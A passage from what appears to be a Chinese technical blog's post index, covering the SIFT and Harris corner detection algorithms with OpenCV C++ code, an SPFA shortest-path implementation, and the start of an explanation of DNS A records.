(int)img.step1();\t\t//面的总通道数，方便指针访问            int rows = img.rows, cols = img.cols;             for( int r = SIFT_IMG_BORDER; r &lt; rows-SIFT_IMG_BORDER; r++)            &#123;                const short* currptr = img.ptr&lt;short&gt;(r);                const short* prevptr = prev.ptr&lt;short&gt;(r);                const short* nextptr = next.ptr&lt;short&gt;(r);                 for( int c = SIFT_IMG_BORDER; c &lt; cols-SIFT_IMG_BORDER; c++)                &#123;                    int val = currptr[c];                     // find local extrema with pixel accuracy\t\t\t\t\t// 寻找局部极值点，DoG中每个点与其所在的立方体周围的26个点比较\t\t\t\t\t// if （val比所有都大 或者 val比所有都小）                    if( std::abs(val) &gt; threshold &amp;&amp;                       ((val &gt; 0 &amp;&amp; val &gt;= currptr[c-1] &amp;&amp; val &gt;= currptr[c+1] &amp;&amp;                         val &gt;= currptr[c-step-1] &amp;&amp; val &gt;= currptr[c-step] &amp;&amp; \t\t\t\t\t\t val &gt;= currptr[c-step+1] &amp;&amp; val &gt;= currptr[c+step-1] &amp;&amp; \t\t\t\t\t\t val &gt;= currptr[c+step] &amp;&amp; val &gt;= currptr[c+step+1] &amp;&amp;                         val &gt;= nextptr[c] &amp;&amp; val &gt;= nextptr[c-1] &amp;&amp; \t\t\t\t\t\t val &gt;= nextptr[c+1] &amp;&amp; val &gt;= nextptr[c-step-1] &amp;&amp; \t\t\t\t\t\t val &gt;= nextptr[c-step] &amp;&amp; val &gt;= nextptr[c-step+1] &amp;&amp; \t\t\t\t\t\t val &gt;= nextptr[c+step-1] &amp;&amp; val &gt;= nextptr[c+step] &amp;&amp; \t\t\t\t\t\t val &gt;= nextptr[c+step+1] &amp;&amp; val &gt;= prevptr[c] &amp;&amp; \t\t\t\t\t\t val &gt;= prevptr[c-1] &amp;&amp; val &gt;= prevptr[c+1] &amp;&amp;                         val &gt;= prevptr[c-step-1] &amp;&amp; val &gt;= prevptr[c-step] &amp;&amp; \t\t\t\t\t\t val &gt;= prevptr[c-step+1] &amp;&amp; val &gt;= prevptr[c+step-1] &amp;&amp; \t\t\t\t\t\t val &gt;= prevptr[c+step] &amp;&amp; val &gt;= prevptr[c+step+1]) ||\t\t\t\t\t\t(val &lt; 0 &amp;&amp; val &lt;= currptr[c-1] &amp;&amp; val &lt;= currptr[c+1] &amp;&amp;                         val &lt;= currptr[c-step-1] &amp;&amp; val &lt;= currptr[c-step] &amp;&amp; \t\t\t\t\t\t val &lt;= currptr[c-step+1] &amp;&amp; val &lt;= currptr[c+step-1] &amp;&amp; \t\t\t\t\t\t val &lt;= currptr[c+step] &amp;&amp; val &lt;= currptr[c+step+1] &amp;&amp;                         val &lt;= nextptr[c] &amp;&amp; val &lt;= nextptr[c-1] &amp;&amp; \t\t\t\t\t\t val &lt;= nextptr[c+1] &amp;&amp; val &lt;= nextptr[c-step-1] &amp;&amp; \t\t\t\t\t\t val &lt;= nextptr[c-step] &amp;&amp; val &lt;= nextptr[c-step+1] &amp;&amp; \t\t\t\t\t\t val &lt;= nextptr[c+step-1] &amp;&amp; val &lt;= nextptr[c+step] &amp;&amp; \t\t\t\t\t\t val &lt;= nextptr[c+step+1] &amp;&amp; val &lt;= prevptr[c] &amp;&amp; \t\t\t\t\t\t val &lt;= prevptr[c-1] &amp;&amp; val &lt;= prevptr[c+1] &amp;&amp;                         val &lt;= prevptr[c-step-1] &amp;&amp; val &lt;= prevptr[c-step] &amp;&amp; \t\t\t\t\t\t val &lt;= prevptr[c-step+1] &amp;&amp; val &lt;= prevptr[c+step-1] &amp;&amp; \t\t\t\t\t\t val &lt;= prevptr[c+step] &amp;&amp; val &lt;= prevptr[c+step+1])))                    &#123;                        int r1 = r, c1 = c, layer = i;\t\t\t\t\t\t\t\t\t\t\t\t// 关键点精确定位，adjustLocalExtrema函数见下述说明                        if( !adjustLocalExtrema(dog_pyr, kpt, o, layer, r1, c1,                                                nOctaveLayers, (float)contrastThreshold,                                                (float)edgeThreshold, (float)sigma) )                            continue;                        \t\t\t\t\t\tfloat scl_octv = kpt.size*0.5f/(1 &lt;&lt; o);\t\t\t\t\t\t// 计算梯度直方图（HOG）                        float omax = calcOrientationHist(\t\t\t\t\t\t\tgauss_pyr[o*(nOctaveLayers+3) + layer],                            Point(c1, r1),                            cvRound(SIFT_ORI_RADIUS * scl_octv),                            SIFT_ORI_SIG_FCTR * scl_octv,                            hist, n);                        float mag_thr = (float)(omax * SIFT_ORI_PEAK_RATIO);                        for( int j = 0; j &lt; n; j++ )                        &#123;                            int l = j &gt; 0 ? j - 1 : n - 1;                            int r2 = j &lt; n-1 ? j + 1 : 0;                             if( hist[j] &gt; hist[l]  &amp;&amp;  hist[j] &gt; hist[r2]  &amp;&amp;  hist[j] &gt;= mag_thr )                            &#123;                                float bin = j + 0.5f * (hist[l]-hist[r2]) / \t\t\t\t\t\t\t\t(hist[l] - 2*hist[j] + hist[r2]);                                bin = bin &lt; 0 ? n + bin : bin &gt;= n ? bin - n : bin;                                kpt.angle = (float)((360.f/n) * bin);                                keypoints.push_back(kpt);                            &#125;                        &#125;                    &#125;                &#125;            &#125;        &#125;&#125;\n角检测器\n在接下推导时，我们需要先了解角检测器原理。\n现有对角点的定义有两个版本：\n\n角点可以是两个边缘的角点；\n角点是邻域内具有两个主方向的特征点；\n\n角点检测算法大致可以分为三类：\n\n基于模板（基于二值图像）\n基于边缘特征（基于轮廓曲线，例如CSS方法）\n基于亮度变化（基于灰度图像，主要有Moravec算子、Forstner算子、Harris算子、SUSAN算子等）\n\n下面会说明Harris角点检测的算法原理，openCV的函数接口是cornerHairrs()；另外比较著名的角点检测方法还有Shi-Tomasi算法，这个算法开始主要是为了解决跟踪问题，用来衡量两幅图像的相似度，我们也可以把它看为Harris算法的改进。OpenCV中已经对它进行了实现，接口函数名为GoodFeaturesToTrack()。\n另外还有一个著名的角点检测算子即SUSAN（Smallest Univalue Segment\nAssimilating\nNucleus，最小核值相似区）算子。SUSAN使用一个圆形模板和一个圆的中心点，通过圆中心点像素与模板圆内其他像素值的比较，统计出与圆中心像素近似的像元数量，当这样的像元数量小于某一个阈值时，就被认为是要检测的角点。可以把SUSAN算子看为Harris算法的一个简化。这个算法原理非常简单，算法效率也高，所以在OpenCV中，它的接口函数名称为：FAST()\n。\n先引入曲率的概念：曲线的曲率（curvature）就是针对曲线上某个点的切线方向角对弧长的转动率，通过微分来定义，表明曲线偏移直线的程度。数学上表明曲线在某一点的弯曲程度的数值。曲率越大，表示曲线的弯曲程度越大。曲率的倒数就是曲率半径。\n\n例如在曲线CD上点A和临近一点B各做一条切线，A和B之间的弧长为S̃，两条切线夹角为α，则曲线CD在A点的曲率为：$\\lim\\limits_{\\Delta S\\to 0}\\frac{\\alpha}{\\Delta\nS}$\nHarris角点\n人眼对角点的识别通常是在一个局部的小区域或小窗口完成的。\n\n如果在各个方向上移动这个特征的小窗口，窗口内区域的灰度发生了较大的变化，那么就认为在窗口内遇到了角点。\n如果这个特定的窗口在图像各个方向上移动时，窗口内图像的灰度没有发生变化，那么窗口内就不存在角点；\n如果窗口在某一个方向移动时，窗口内图像的灰度发生了较大的变化，而在另一些方向上没有发生变化，那么，窗口内的图像可能就是一条直线的线段。\n\n\n对于图像I(x, y)，当在点(x, y)处平移(Δx, Δy)后的自相似性，可以通过自相关函数给出：\n$$\nc(x,y;\\Delta x,\\Delta y)=\\sum\\limits_{(u,v)\\in\nW(x,y)}w(u,v)(I(u,v)–I(u+\\Delta x,v+\\Delta y))^2\n$$ 其中，W(x, y)是以点(x, y)为中心的窗口，w(u, v)为加权函数，它既可是常数（下图左），也可以是高斯加权函数（下图右）。\n\n对图像I(x, y)在平移(Δx, Δy)后进行一阶泰勒近似：\n$$\n\\begin{align}\nI(u+\\Delta x,v+\\Delta y) &amp;=\nI(u,v)+I_x(u,v)\\Delta x+I_y(u,v)\\Delta y+O(\\Delta x^2,\\Delta y^2)  \\\\\n&amp;\\approx I(u,v)+I_x(u,v)\\Delta x+I_y(u,v)\\Delta y \\\\\n\\end{align}\n$$ 其中，Ix、Iy是图像I(x, y)的偏导数，这样的话，自相关函数则可以简化为（暂时省略w(u, v)，不影响结算结果）：\n$$\n\\begin{align}\nc(x,y;\\Delta x, \\Delta y) &amp; \\approx \\sum_\\limits{w}(I_x(x,y)\\Delta x\n+ I_y(x,y)\\Delta y)^2 \\\\\n&amp;= \\begin{bmatrix} \\Delta x &amp; \\Delta y\\end{bmatrix}M(x,y)\n\\begin{bmatrix} \\Delta x\\\\ \\Delta y\\end{bmatrix}\n\\end{align}\n$$ 其中 $$\n\\begin{align}\nM(x,y) &amp;= \\sum_\\limits{w} \\begin{bmatrix} I_x(x,y)^2  &amp;\nI_x(x,y)I_y(x,y) \\\\ I_x(x,y)I_y(x,y) &amp; I_y(x,y)^2\\end{bmatrix} \\\\\n&amp;=\\begin{bmatrix} \\sum_w I_x(x,y)^2  &amp; \\sum_w I_x(x,y)I_y(x,y)\n\\\\ \\sum_w I_x(x,y)I_y(x,y) &amp; \\sum_w I_y(x,y)^2\\end{bmatrix} \\\\\n&amp;=\\begin{bmatrix} A &amp; B \\\\ B &amp; C\\end{bmatrix}\n\\end{align}\n$$ 也就是说图像I(x, y)在点(x, y)处平移(Δx, Δy)后的自相关函数可以近似为二项函数：\nc(x, y; Δx, Δy) ≈ AΔx2 + 2BΔxΔy + CΔy2\n其中 $$\nA=\\sum_\\limits{w}I_x^2,\\quad B=\\sum_\\limits{w}I_xI_y,\\quad\nC=\\sum_\\limits{w}I_y^2\n$$ 二次项函数本质上就是一个椭圆函数。如下图所示，椭圆一般方程为：\nAx2 + Bxy + Cy2 + Dx + Ey + 1 = 0\n可把$[\\Delta x, \\Delta y]M(x,y)\n\\begin{bmatrix} \\Delta x\\\\ \\Delta y\\end{bmatrix}=A\\Delta x^2 + 2B\\Delta\nx \\Delta y+C\\Delta\ny^2=1$类比于一般椭圆。椭圆的扁率和尺寸是由M(x, y)的特征值λ1、λ2决定的，椭圆的方向是由M(x, y)的特征矢量决定的。\n\n椭圆函数特征值与图像中的角点、直线（边缘）和平面之间的关系如下图所示。共可分为三种情况：\n\n图像中的直线。 一个特征值大，另一个特征值小，λ1 ≪ λ2或λ1 ≫ λ2。自相关函数值在某一方向上大，在其他方向上小。\n图像中的平面。\n两个特征值都小，且近似相等；自相关函数数值在各个方向上都小。\n图像中的角点。\n两个特征值都大，且近似相等，自相关函数在所有方向都增大。\n\n\n根据二次项函数特征值的计算公式，我们可以求M(x, y)矩阵的特征值。但是Harris给出的角点差别方法并不需要计算具体的特征值，而是计算一个角点响应值R来判断角点。R的计算公式为： R = detM − α(traceM)2\n示中，detM为矩阵$M=\\begin{bmatrix} A &amp; B \\\\ B &amp;\nC\\end{bmatrix}$的行列式；traceM为矩阵M的迹；α经常为常数，取值范围为0.04 ∼ 0.06。实际上，特征值是隐含在detM和traceM中的，因为：\n$$\n\\begin{align}\ndetM&amp;=\\lambda_1\\lambda_2=AC-B^2 \\\\\ntraceM&amp;= \\lambda_1+\\lambda_2 = A+C\n\\end{align}\n$$\nHarris角点算法实现\n根据上述讨论，可以将Harris图像角点检测算法归纳如下，共分以下五步：\n\n计算图像 I(x, y)在X和Y两个方向的梯度Ix、Iy。 $$\nI_x=\\frac{\\partial I}{\\partial x}=I\\otimes\\begin{pmatrix} -1&amp; 0\n&amp;1\\end{pmatrix},\nI_y=\\frac{\\partial I}{\\partial y}=I\\otimes\\begin{pmatrix} -1&amp; 0\n&amp;1\\end{pmatrix}^T\n$$ 卷积$\\begin{pmatrix} -1&amp; 0\n&amp;1\\end{pmatrix}$的结果该位置的后一个像素与前一个像素之差。\n计算图像两个方向梯度的乘积。\n\nIx2 = Ix ⋅ Iy,  Iy2 = Iy ⋅ Iy,  Ixy = Ix ⋅ Iy\n\n使用高斯函数对Ix2、Iy2和Ixy进行高斯加权（取σ = 1），生成矩阵M的元素A、B和C。\n\n$$\n\\begin{align}\nA&amp;=g(I_x^2) =I_x^2\\otimes w \\\\\nB&amp;=g(I_{xy})=I_{xy} \\otimes w\\\\\nC&amp;=g(I_y^2)=I_y^2\\otimes w \\\\\n\\end{align}\n$$\n\n计算每个像素的Harris响应值R，并对小于某一阈值t的R置为零。\n\nR = (detM − α(traceM)2 &lt; t) ? 0 : detM − α(traceM)2\n\n在3 × 3或5 × 5的邻域内进行非极大值抑制（可以理解为局部最大搜索），局部最大值点即为图像中的角点。\n\n参数α的影响\n假设已经得到了矩阵M的特征值λ1 ≥ λ2 ≥ 0,令λ2 = kλ1, 0 ≤ k ≤ 1。由特征值与矩阵M的迹和行列式的关系可得： $$\ndetM=\\prod_\\limits{i}\\lambda_i,\\quad traceM=\\sum_\\limits{i}\\lambda_i\n$$ 可以得到角点的响应R:\nR = λ1λ2 − α(λ1 + λ2)2 = λ12[k − α(1 + k)2]\n假设R ≥ 0，可得： $$\n0\\leq\\alpha\\leq\\frac{k}{(1+k)^2}\\leq0.25\n$$\n\n对于较小的k值，R ≈ λ2(k − α), α &lt; k。\n由此，可以得出这样的结论：增大α的值，将减小角点响应值R，降低角点检测的灵性，减少被检测角点的数量；减小α值，将增大角点响应值R，增加角点检测的灵敏性，增加被检测角点的数量。\nHarris的特性\n\nHarris角点检测算子对亮度和对比度的变化不敏感；\nHarris角点检测算子具有旋转不变性；\nHarris角点检测算子不具有尺度不变性。\n\nopenCV Hairrs角点检测函数\nOpenCV的Hairrs角点检测的函数为cornerHairrs()，但是它的输出是一幅浮点值图像，浮点值越高，表明越可能是特征角点，我们需要对图像进行阈值化。\nvoid cornerHarris(InputArray src, OutputArray dst, int blockSize, int apertureSize, double k, int borderType = BORDER_DEFAULT);\n\nsrc – 输入的单通道8-bit或浮点图像。\ndst –\n存储着Harris角点响应的图像矩阵，大小与输入图像大小相同，是一个浮点型矩阵。\nblockSize – 邻域大小。\napertureSize – 扩展的微分算子大。\nk – 响应公式中的参数α 。\nboderType – 边界处理的类型。\n\n删除边缘效应\n为了得到稳定的特征点，除了之前删除DoG响应较低的点，我们还应该注意DoG对图像边缘有较强的响应值，有些极值点的位置是在图像的边缘位置的，因为图像的边缘点很难定位，同时也容易受到噪声的干扰，我们把这些点看做是不稳定的极值点，需要进行去除。\n此处先引进Hessian矩阵，Hessian矩阵是一个多元函数的二阶偏导数构成的方阵，描述了函数的局部曲率。在边缘梯度的方向上主曲率值比较大，而沿着边缘方向则主曲率值较小。候选特征点的DoG函数的主曲率与2 × 2Hessian矩阵H的特征值成正比： $$\nH(x,y)=\\begin{bmatrix} I_{xx}(x,y) &amp; I_{xy}(x,y) \\\\ I_{yx}(x,y)\n&amp; I_{yy}(x,y)\\end{bmatrix}\n$$\n注意：Harris角检测利用的是一阶导数的协方差矩阵，Hessian是二阶偏导数，他们的形式和对角点的判据差不多，所以容易混淆。\n另外，根据Hessian矩阵对称性，如果函数I的二阶偏导数连续，则二阶偏导数的求导顺序没有区别，即Ixy(x, y) = Iyx(x, y)。\nIxx(x, y)，Ixy(x, y)\n和Iyy(x, y)是候选点邻域位置差分求得的，可参考Harris求法。\n为了避免求具体的值，可以使用H特征值的比例表示H。设α = λmax为H的最大特征值，β = λmin为H的最小特征值。则有： $$\n\\begin{align}\ntraceH &amp;= I_{xx}(x,y)+I_{yy}(x,y)=\\alpha + \\beta \\\\\ndetH &amp;= I_{xx}(x,y)I_{yy}(x,y)-I_{xy}^2(x,y)=\\alpha \\cdot \\beta\n\\end{align}\n$$ 同样：traceH表示矩阵H的迹，detH表示H的行列式。\n令$\\gamma=\\frac{\\alpha}{\\beta}$表示最大特征值与最小特征值的比值，则：\n$$\n\\frac{traceH^2}{detH}=\\frac{(\\alpha + \\beta)^2}{\\alpha \\beta}\n=\\frac{(\\gamma+1)^2}{\\gamma}\n$$\n上式的结果与两个特征值的比例有关，和具体的大小无关。当两个特征值相等时其值最小，并且随着γ\n的增大而增大。因此为了检测主曲率是否在某个阈值Tγ下，只需检测：\n$$\n\\frac{traceH^2}{detH} &gt; \\frac{(T_\\gamma+1)^2}{T_\\gamma}\n$$ 如果上式成立，则剔除该特征点，否则保留。（Lowe论文中取Tγ = 10)\n// Interpolates a scale-space extremum&#x27;s location and scale to subpixel// accuracy to form an image feature.  Rejects features with low contrast.// Based on Section 4 of Lowe&#x27;s paper.// 特征点精确定位static bool adjustLocalExtrema( const vector&lt;Mat&gt;&amp; dog_pyr, KeyPoint&amp; kpt, int octv,                                int&amp; layer, int&amp; r, int&amp; c, int nOctaveLayers,                                float contrastThreshold, float edgeThreshold, float sigma )&#123;    const float img_scale = 1.f/(255*SIFT_FIXPT_SCALE);    const float deriv_scale = img_scale*0.5f;    const float second_deriv_scale = img_scale;    const float cross_deriv_scale = img_scale*0.25f;     float xi=0, xr=0, xc=0, contr;    int i = 0; \t//三维子像元插值    for( ; i &lt; SIFT_MAX_INTERP_STEPS; i++ )    &#123;        int idx = octv*(nOctaveLayers+2) + layer;        const Mat&amp; img = dog_pyr[idx];        const Mat&amp; prev = dog_pyr[idx-1];        const Mat&amp; next = dog_pyr[idx+1];         Vec3f dD((img.at&lt;short&gt;(r, c+1) - img.at&lt;short&gt;(r, c-1))*deriv_scale,                 (img.at&lt;short&gt;(r+1, c) - img.at&lt;short&gt;(r-1, c))*deriv_scale,                 (next.at&lt;short&gt;(r, c) - prev.at&lt;short&gt;(r, c))*deriv_scale);         float v2 = (float)img.at&lt;short&gt;(r, c)*2;        float dxx = (img.at&lt;short&gt;(r, c+1) + \t\t\t\timg.at&lt;short&gt;(r, c-1) - v2)*second_deriv_scale;        float dyy = (img.at&lt;short&gt;(r+1, c) + \t\t\t\timg.at&lt;short&gt;(r-1, c) - v2)*second_deriv_scale;        float dss = (next.at&lt;short&gt;(r, c) + \t\t\t\tprev.at&lt;short&gt;(r, c) - v2)*second_deriv_scale;        float dxy = (img.at&lt;short&gt;(r+1, c+1) - \t\t\t\timg.at&lt;short&gt;(r+1, c-1) - img.at&lt;short&gt;(r-1, c+1) + \t\t\t\timg.at&lt;short&gt;(r-1, c-1))*cross_deriv_scale;        float dxs = (next.at&lt;short&gt;(r, c+1) - \t\t\t\tnext.at&lt;short&gt;(r, c-1) - prev.at&lt;short&gt;(r, c+1) + \t\t\t\tprev.at&lt;short&gt;(r, c-1))*cross_deriv_scale;        float dys = (next.at&lt;short&gt;(r+1, c) - \t\t\t\tnext.at&lt;short&gt;(r-1, c) - prev.at&lt;short&gt;(r+1, c) + \t\t\t\tprev.at&lt;short&gt;(r-1, c))*cross_deriv_scale;         Matx33f H(dxx, dxy, dxs,                  dxy, dyy, dys,                  dxs, dys, dss);         Vec3f X = H.solve(dD, DECOMP_LU);         xi = -X[2];        xr = -X[1];        xc = -X[0];         if( std::abs( xi ) &lt; 0.5f  &amp;&amp;  std::abs( xr ) &lt; 0.5f  &amp;&amp;  std::abs( xc ) &lt; 0.5f )            break; \t\t//将找到的极值点对应成像素（整数）        c += cvRound( xc );        r += cvRound( xr );        layer += cvRound( xi );         if( layer &lt; 1 || layer &gt; nOctaveLayers ||           c &lt; SIFT_IMG_BORDER || c &gt;= img.cols - SIFT_IMG_BORDER  ||           r &lt; SIFT_IMG_BORDER || r &gt;= img.rows - SIFT_IMG_BORDER )            return false;    &#125;     /* ensure convergence of interpolation */\t// SIFT_MAX_INTERP_STEPS:插值最大步数，避免插值不收敛，程序中默认为5    if( i &gt;= SIFT_MAX_INTERP_STEPS )        return false;     &#123;        int idx = octv*(nOctaveLayers+2) + layer;        const Mat&amp; img = dog_pyr[idx];        const Mat&amp; prev = dog_pyr[idx-1];        const Mat&amp; next = dog_pyr[idx+1];        Matx31f dD((img.at&lt;short&gt;(r, c+1) - img.at&lt;short&gt;(r, c-1))*deriv_scale,                   (img.at&lt;short&gt;(r+1, c) - img.at&lt;short&gt;(r-1, c))*deriv_scale,                   (next.at&lt;short&gt;(r, c) - prev.at&lt;short&gt;(r, c))*deriv_scale);        float t = dD.dot(Matx31f(xc, xr, xi));         contr = img.at&lt;short&gt;(r, c)*img_scale + t * 0.5f;        if( std::abs( contr ) * nOctaveLayers &lt; contrastThreshold )            return false;         /* principal curvatures are computed using the trace and det of Hessian */       //利用Hessian矩阵的迹和行列式计算主曲率的比值\t   float v2 = img.at&lt;short&gt;(r, c)*2.f;        float dxx = (img.at&lt;short&gt;(r, c+1) + \t\t\t\timg.at&lt;short&gt;(r, c-1) - v2)*second_deriv_scale;        float dyy = (img.at&lt;short&gt;(r+1, c) + \t\t\t\timg.at&lt;short&gt;(r-1, c) - v2)*second_deriv_scale;        float dxy = (img.at&lt;short&gt;(r+1, c+1) - \t\t\t\timg.at&lt;short&gt;(r+1, c-1) - img.at&lt;short&gt;(r-1, c+1) + \t\t\t\timg.at&lt;short&gt;(r-1, c-1)) * cross_deriv_scale;        float tr = dxx + dyy;        float det = dxx * dyy - dxy * dxy; \t\t//这里edgeThreshold可以在调用SIFT()时输入；\t\t//其实代码中定义了 static const float SIFT_CURV_THR = 10.f 可以直接使用        if( det &lt;= 0 || tr*tr*edgeThreshold &gt;= (edgeThreshold + 1)*(edgeThreshold + 1)*det )            return false;    &#125;     kpt.pt.x = (c + xc) * (1 &lt;&lt; octv);    kpt.pt.y = (r + xr) * (1 &lt;&lt; octv);    kpt.octave = octv + (layer &lt;&lt; 8) + (cvRound((xi + 0.5)*255) &lt;&lt; 16);    kpt.size = sigma*powf(2.f, (layer + xi) / nOctaveLayers)*(1 &lt;&lt; octv)*2;     return true;&#125;\n3. 方向赋值\n上面我们已经找到了关键点。为了实现图像旋转不变性，需要根据检测到的关键点局部图像结构为特征点方向赋值。我们使用图像的梯度直方图法求关键点局部结构的稳定方向。\n梯度方向和幅值\n在前文中，精确定位关键点后也找到特征点的尺度值σ\n，根据这一尺度值，得到最接近这一尺度值的高斯图像： L(x, y) = G(x, y, σ) ⊗ I(x, y)\n使用有限差分，计算以关键点为中心，以3 × 1.5σ为半径的区域内图像梯度的幅值m(x, y)和幅角θ(x, y)，公式如下：\n$$\n\\begin{align}\nm(x,y) &amp;= \\sqrt{(L(x+1, y) - L(x-1,y))^2+(L(x,y+1)-L(x,y-1))^2} \\\\\n\\theta(x,y)&amp;=arctan(\\frac{L(x,y+1)-L(x,y-1)}{L(x+1,y)-L(x-1,y)})\n\\end{align}\n$$\n梯度直方图\n在完成关键点邻域内高斯图像梯度计算后，使用直方图统计邻域内像素对应的梯度方向和幅值。\n梯度方向直方图的横轴是梯度方向角，纵轴是剃度方向角对应的梯度幅值累加值。梯度方向直方图将0°~360°的范围分为36个柱，每10°为一个柱。可看作一定区域内的图像像素点对关键点方向生成所作的贡献。\n\n在计算直方图时，每个加入直方图的采样点都使用圆形高斯函数函数进行了加权处理，也就是进行高斯平滑。Lowe建议子区域的像素的梯度大小σ = 0.5d的高斯加权计算。这主要是因为SIFT算法只考虑了尺度和旋转不变形，没有考虑仿射不变性。通过高斯平滑，可以使关键点附近的梯度幅值有较大权重，从而部分弥补没考虑仿射不变形产生的特征点不稳定。\n通常离散的梯度直方图要进行插值拟合处理，以求取更精确的方向角度值。\n关键点方向\n直方图峰值代表该关键点处邻域内图像梯度的主方向，也就是该关键点的主方向。在梯度方向直方图中，当存在另一个相当于主峰值80%能量的峰值时，则将这个方向认为是该关键点的辅方向。\n所以一个关键点可能检测得到多个方向，这可以增强匹配的鲁棒性。Lowe的论文指出大概有15%关键点具有多方向，但这些点对匹配的稳定性至为关键。\n获得图像关键点主方向后，每个关键点有三个信息(x, y, σ, θ)：位置、尺度、方向。\n由此我们可以确定一个SIFT特征区域。通常使用一个带箭头的圆或直接使用箭头表示SIFT区域的三个值：中心表示特征点位置，半径表示关键点尺度（r = 2.5σ），箭头表示主方向。\n具有多个方向的关键点可以复制成多份，然后将方向值分别赋给复制后的关键点。如下图：\n\n3. 关键点描述\n上文找到的关键点（SIFT特征点）包含位置、尺度和方向的信息。接下来的步骤是关键点描述，即用用一组向量将这个关键点描述出来，这个描述子不但包括关键点，也包括关键点周围对其有贡献的像素点。\n用来作为目标匹配的依据（所以描述子应该有较高的独特性，以保证匹配率），也可使关键点具有更多的不变特性，如光照变化、3D视点变化等。\nSIFT描述子h(x, y, θ)是对关键点附近邻域内高斯图像梯度统计的结果，是一个三维矩阵，但通常用一个矢量来表示。特征向量通过对三维矩阵按一定规律排列得到。\n描述子采样区域\n特征描述子与关键点所在尺度有关，因此对梯度的求取应在特征点对应的高斯图像上进行。\n将关键点附近划分成d × d个子区域，每个子区域尺寸为mσ个像元（d = 4，m = 3，σ为尺特征点的尺度值）。考虑到实际计算时需要双线性插值，故计算的图像区域为mσ(d + 1)，再考虑旋转，则实际计算的图像区域为$\\sqrt{2}m\\sigma(d+1)$，如下图所示：\n\n区域坐标轴旋转\n为了保证特征矢量具有旋转不变性，要以特征点为中心，在附近邻域内旋转θ角，即旋转为特征点的方向。\n\n旋转后区域内采样点新的坐标为： $$\n\\begin{pmatrix} x' \\\\ y'\\end{pmatrix} = \\begin{pmatrix} cos\\theta &amp;\n-sin\\theta \\\\ sin\\theta &amp; cos\\theta\\end{pmatrix} \\begin{pmatrix} x\n\\\\ y\\end{pmatrix}\n$$\n计算采样区域梯度直方图\n将旋转后区域划分为d × d个子区域（每个区域间隔为mσ\n像元），在子区域内计算8个方向的梯度直方图，绘制每个方向梯度方向的累加值，形成一个种子点。\n与求主方向不同的是，此时，每个子区域梯度方向直方图将0°~360°划分为8个方向区间，每个区间为45°。即每个种子点有8个方向区间的梯度强度信息。由于存在d × d，即4 × 4个子区域，所以最终共有4 × 4 × 8 = 128个数据（Lowe建议的数据），形成128维SIFT特征矢量。\n\n对特征矢量需要加权处理，加权采用$\\frac{m\\sigma\nd}{2}$的标准高斯函数。为了除去光照变化影响，还有进一步归一化处理。\n至此SIFT描述子生成，SIFT算法也基本完成了。\n"},{"title":"SPFA算法：queue+vector的实现","url":"/2017/05/24/SPFA%E7%AE%97%E6%B3%95%EF%BC%9Aqueue+vector%E7%9A%84%E5%AE%9E%E7%8E%B0/","content":"\nSPFA（Shortest Path Faster\nAlgorithm）（队列优化）算法是求单源最短路径的一种算法，它还有一个重要的功能是判负环（在差分约束系统中会得以体现），在Bellman-ford算法的基础上加上一个队列优化，减少了冗余的松弛操作，是一种高效的最短路算法。\nspfa的算法思想 —— 动态逼近法：\n​设立一个先进先出的队列q用来保存待优化的结点，优化时每次取出队首结点u，并且用u点当前的最短路径估计值对离开u点所指向的结点v进行松弛操作，如果v点的最短路径估计值有所调整，且v点不在当前的队列中，就将v点放入队尾。这样不断从队列中取出结点来进行松弛操作，直至队列空为止。\n​松弛操作的原理是著名的定理：“三角形两边之和大于第三边”，在信息学中我们叫它三角不等式。所谓对结点i,j进行松弛，就是判定是否dis[j]&gt;dis[i]+w[i,j]，如果该式成立则将dis[j]减小到dis[i]+w[i,j]，否则不动。\n代码采用c++中STL模板(queue + vector),\n减少不必的空间开销以及提高代码易读性\n#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;array&gt;const int N = 20000 + 10;std::queue&lt;int&gt; q;auto next = std::vector&lt;std::vector&lt;int&gt;&gt;(N);auto val = std::vector&lt;std::vector&lt;int&gt;&gt;(N);std::array&lt;bool, N&gt; vis;std::array&lt;long long, N&gt; dis;int n, m, start = 1;void input();void init();void spfa() &#123;    while (!q.empty()) &#123;        int tem = q.front();        q.pop();        for (int i = 0; i &lt; next[tem].size(); i++) &#123;            if (dis[next[tem][i]] &gt; dis[tem] + val[tem][i]) &#123;                dis[next[tem][i]] = dis[tem] + val[tem][i];                if (!vis[next[tem][i]]) &#123;                    vis[next[tem][i]] = true;                    q.push(next[tem][i]);                &#125;            &#125;        &#125;    &#125;    for (int i = 1; i &lt;= n; i++)        std::cout &lt;&lt; dis[i] &lt;&lt; std::endl;&#125;int main() &#123;    input();    init();    spfa();    return 0;&#125;void input() &#123;    std::cin &gt;&gt; n &gt;&gt; m;     // n 个点， m条边    for (int i = 1; i &lt;= m; i++) &#123;        int a, b, t;        // a -&gt; b 存在一条距离为 t 的边        std::cin &gt;&gt; a &gt;&gt; b &gt;&gt; t;        next[a].push_back(b);        val[a].push_back(t);    &#125;&#125;void init() &#123;    vis.fill(false);    dis.fill(0x3f3f3f3f);    dis[start] = 0;    q.push(start);    vis[start] = true;&#125;\n"},{"title":"DNS记录类型说明","url":"/2019/07/02/DNS%E8%AE%B0%E5%BD%95%E7%B1%BB%E5%9E%8B%E8%AF%B4%E6%98%8E/","content":"DNS\n域名系统（英文：Domain Name\nSystem，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。\nA记录（主机记录）\nA（Address）记录是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web server上。\n以域名liuchang.men为例，添加A记录：\n\n\n\n类型\n名称\n值\n\n\n\n\nA\nproxy\n47.101.212.137\n\n\n\nproxy.liuchang.men是指定域名对应的IP地址47.101.212.137。\nA记录同时也可以设置域名的二级域名，如：\n\n\n\n类型\n名称\n值\n\n\n\n\nA\n*.proxy\n47.101.212.137\n\n\n\n使用通配符*泛解析所有 *.proxy.liuchang.men\n指向IP地址47.101.212.137。\nCNAME记录（别名记录）\nCNAME（Canonical Name 